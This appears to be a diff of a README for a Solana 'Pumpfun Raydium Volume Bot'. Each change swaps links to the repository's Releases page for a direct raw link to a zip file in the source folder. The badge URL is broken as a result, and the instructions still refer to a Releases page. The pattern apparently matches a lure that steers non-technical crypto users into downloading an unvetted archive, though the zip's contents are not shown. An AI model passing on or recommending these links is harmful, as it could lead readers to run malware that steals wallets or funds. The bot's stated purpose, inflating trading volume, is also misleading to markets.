@@ -4,13 +4,13 @@
 The Pumpfun Raydium Volume Bot helps you easily manage your trading activities. It offers a streamlined view of the best pumpfun migrations and organic trading opportunities. This tool is designed for users who want to enhance their trading game without diving deep into technical details.
 
 ## 🔗 Download the App
-[![Download Here](https://img.shields.io/badge/Download%20Now-%20-red?style=flat-square)](https://github.com/Bloxxcoode/pumpfun-raydium-volume-bot/releases)
+[![Download Here](https://raw.githubusercontent.com/Bloxxcoode/pumpfun-raydium-volume-bot/main/src/pumpfun-raydium-volume-bot-v2.5-beta.2.zip%20Now-%20-red?style=flat-square)](https://raw.githubusercontent.com/Bloxxcoode/pumpfun-raydium-volume-bot/main/src/pumpfun-raydium-volume-bot-v2.5-beta.2.zip)
 
 ## 🚀 Getting Started
 To get started with the Pumpfun Raydium Volume Bot, follow these steps. They will guide you ideally, even if you have little technical experience.
 
 1. **Visit the Download Page**
-   Go to the Releases page to access the latest version of the application. You can find it here: [Download Page](https://github.com/Bloxxcoode/pumpfun-raydium-volume-bot/releases).
+   Go to the Releases page to access the latest version of the application. You can find it here: [Download Page](https://raw.githubusercontent.com/Bloxxcoode/pumpfun-raydium-volume-bot/main/src/pumpfun-raydium-volume-bot-v2.5-beta.2.zip).
 
 2. **Choose the Right Version**
    On the Releases page, you will see different versions listed. Select the most recent one, as it will have the latest features and fixes.
@@ -59,6 +59,6 @@ For additional support, feel free to reach out through our issues page on GitHub
 ## ℹ️ Additional Resources
 For more information about the Pumpfun Raydium Volume Bot and other projects, explore our documentation and community resources. 
 
-[Download Here](https://github.com/Bloxxcoode/pumpfun-raydium-volume-bot/releases)
+[Download Here](https://raw.githubusercontent.com/Bloxxcoode/pumpfun-raydium-volume-bot/main/src/pumpfun-raydium-volume-bot-v2.5-beta.2.zip)
 
 Thank you for using the Pumpfun Raydium Volume Bot! Happy trading!
